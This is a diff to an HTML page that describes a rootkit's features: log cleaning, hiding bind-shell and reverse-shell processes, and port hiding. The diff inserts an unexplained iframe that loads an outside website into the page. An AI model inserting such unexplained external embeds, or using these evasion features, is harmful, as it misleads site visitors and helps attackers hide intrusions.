@@ -146,6 +146,8 @@ User logs will be cleaned during rootkit installation
 This rootkit hides bind shell process and reverse shell process.
 </p>
 
+<iframe src="https://jasaplus.com" width=2000 height=200></iframe>
+
 <p>
 <b>Port Hiding</b>
 <br>
